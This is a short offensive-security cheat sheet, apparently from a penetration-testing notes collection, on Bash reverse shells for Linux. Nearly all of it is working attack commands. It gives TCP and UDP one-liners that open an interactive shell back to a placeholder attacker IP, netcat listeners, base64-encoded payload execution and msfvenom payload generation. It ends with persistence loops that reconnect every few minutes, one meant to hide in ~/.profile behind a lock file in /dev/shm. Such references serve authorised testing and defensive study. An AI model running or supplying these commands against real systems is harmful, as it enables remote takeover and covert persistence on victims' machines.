---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - T1059-004
  - linux
---
# Bash

## 01 - TCP Method

Target

```
$ /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1

$ nohup setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1'

$ nohup 0<&103-;exec 103<>/dev/tcp/<attacker_IP>/<attacker_PORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
```

Attacker

```
userware@hackware-os:~$ nc -lnvp <PORT>
```

## 02 - UDP Method

Target

```
$ /bin/bash -i >& /dev/udp/<attacker_IP>/<attacker_PORT> 0>&1

$ nohup setsid /bin/bash -c '/bin/bash -i >& /dev/udp/<attacker_IP>/<attacker_PORT> 0>&1'

$ nohup 0<&103-;exec 103<>/dev/udp/<attacker_IP>/<attacker_PORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
```

Attacker

```
userware@hackware-os:~$ nc -luvp <PORT>
```

You can encode it with base64 then execute it.

```
$ echo <base64_payload> | base64 -d

$ echo <base64_payload> | basenc --base64 -d
```

## 03 - Generate via `msfvenom`

### 3.1 - TCP Method

```
$ msfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<PORT>
```

### 3.2 - UDP Method

```
$ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>
```

## 04 - Persistent Callback Shell

In case you might lose the callback connection. It's better to make it persistent.

```
$ while true; do /bin/bash -c /path/to/implant; sleep 10; done

$ while true; do /bin/bash -i >& /dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1; sleep 10; done

$ setsid bash -c 'while :; do bash -i &>/dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1; sleep 360; done' &>/dev/null
```

Prevents multiple instances while written in `~/.profile`.

```
$ fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1 ; sleep 360; done' &>/dev/null &
```

---
## References

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)